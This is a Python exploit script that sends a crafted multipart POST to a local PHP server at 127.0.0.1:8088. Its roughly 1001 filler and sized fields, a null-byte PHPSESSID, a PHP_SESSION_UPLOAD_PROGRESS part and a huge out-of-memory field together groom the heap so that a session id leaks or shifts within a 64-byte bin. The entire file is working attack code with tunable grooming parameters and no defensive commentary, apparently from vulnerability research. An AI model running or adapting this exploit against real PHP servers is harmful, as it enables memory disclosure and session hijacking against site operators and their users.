#!/usr/bin/env python3
"""Leak prime with E pre-warning 39-char-value fields (live 64B strings) to
shift the random session id within its 64B bin page.

usage: send_a_leak4.py E BNDLEN FILE_NAME_LEN FILENAME_LEN HUGE_MB
Parts: (1001-2-E) fillers (5-char name, 1-char value)
       + E special fields (5-char name, 39-char value)  [registered]
       + PHPSESSID (value \x00)
       + PHP_SESSION_UPLOAD_PROGRESS (3-char value; this is part 1001 -> warning)
       + file part + huge OOM field
"""
import socket,sys
E=int(sys.argv[1]); BNL=int(sys.argv[2]) if len(sys.argv)>2 else 17
FNL=int(sys.argv[3]) if len(sys.argv)>3 else 1
FNLEN=int(sys.argv[4]) if len(sys.argv)>4 else 5
HUGE=int(sys.argv[5]) if len(sys.argv)>5 else 12
NF=1001-2-E
BND=b'S'*BNL
parts=[]
for i in range(NF):
    parts.append({'name':('f%04d'%i)[:5],'data':b'x'})
for i in range(E):
    parts.append({'name':('e%04d'%i)[:5],'data':b'E'*39})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'F'*FNL,'filename':'G'*FNLEN,'data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
